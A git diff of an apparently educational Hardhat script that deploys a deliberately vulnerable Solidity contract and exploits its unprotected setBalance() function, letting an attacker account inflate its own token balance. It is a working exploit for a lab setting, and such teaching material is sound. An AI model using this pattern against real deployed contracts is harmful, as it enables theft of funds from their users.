@@ -3,7 +3,9 @@ const fs = require("fs");
 const path = require("path");
 
 async function main() {
-  console.log("🚀 Initiating attack on SC04_LackOfInputValidation_Vulnerable...");
+  console.log(
+    "🚀 Initiating attack on SC04_LackOfInputValidation_Vulnerable..."
+  );
 
   // --- 1. GET THE SIGNERS ---
   const [deployer, attacker] = await ethers.getSigners();
@@ -11,43 +13,39 @@ async function main() {
   console.log(`Deployer Address: ${deployer.address}`);
   console.log(`Attacker Address: ${attacker.address}`);
 
-  // --- 2. GET THE DEPLOYED CONTRACT ---
-  const envPath = path.join(__dirname, "..", "frontend", ".env");
-  if (!fs.existsSync(envPath)) {
-    throw new Error("❌ Could not find the .env file in frontend/. Please deploy contracts first.");
-  }
-  const envFile = fs.readFileSync(envPath, "utf8");
-  const addressMatch = envFile.match(/VITE_SC04_VULNERABLE_ADDRESS='(.*)'/);
-
-  if (!addressMatch) {
-    throw new Error("❌ Could not find the vulnerable contract address in frontend/.env. Please deploy contracts first.");
-  }
-  const vulnerableContractAddress = addressMatch[1];
-  console.log(`\n🎯 Target Contract Address: ${vulnerableContractAddress}`);
-
-  const vulnerableContract = await ethers.getContractAt("SC04_LackOfInputValidation_Vulnerable", vulnerableContractAddress);
+  // --- 2. DEPLOY THE CONTRACT ---
+  console.log("\nDeploying contract...");
+  const Contract = await ethers.getContractFactory(
+    "SC04_LackOfInputValidation_Vulnerable"
+  );
+  const contract = await Contract.deploy();
+  await contract.waitForDeployment();
+  console.log(`🎯 Target Contract Address: ${contract.target}`);
 
   // --- 3. EXECUTE THE ATTACK ---
   console.log("\n💰 Checking attacker's balance before the attack...");
-  const balanceBefore = await vulnerableContract.balances(attacker.address);
-  console.log(`   - Attacker's balance in contract: ${balanceBefore.toString()}`);
+  let attackerBalance = await contract.balances(attacker.address);
+  console.log(`   - Attacker's balance: ${attackerBalance}`);
 
-  const attackAmount = ethers.parseUnits("1000000", 18); // Give 1,000,000 tokens
-  console.log(`\n💥 ATTACKING: Calling the vulnerable setBalance() function to give the attacker ${ethers.formatUnits(attackAmount, 18)} tokens...`);
-  
-  // The attacker calls setBalance for their own address with a large amount
-  const tx = await vulnerableContract.connect(attacker).setBalance(attacker.address, attackAmount);
+  console.log("\n💥 ATTACKING: Setting attacker's balance to a high value...");
+  const tx = await contract
+    .connect(attacker)
+    .setBalance(attacker.address, ethers.parseEther("1000"));
   await tx.wait();
   console.log("✅ Attack transaction successful!");
 
   console.log("\n💰 Checking attacker's balance after the attack...");
-  const balanceAfter = await vulnerableContract.balances(attacker.address);
-  console.log(`   - Attacker's balance in contract: ${balanceAfter.toString()}`);
+  attackerBalance = await contract.balances(attacker.address);
+  console.log(
+    `   - Attacker's balance: ${ethers.formatEther(attackerBalance)} ETH`
+  );
 
-  if (balanceAfter === attackAmount) {
-    console.log("\n🎉 SUCCESS: The attacker has successfully manipulated their balance!");
+  if (attackerBalance > 0) {
+    console.log(
+      "\n🎉 SUCCESS: The attacker has successfully inflated their balance!"
+    );
   } else {
-    console.log("\n😞 FAILED: The attacker's balance was not updated as expected.");
+    console.log("\n😞 FAILED: The attacker could not inflate their balance.");
   }
 }
 
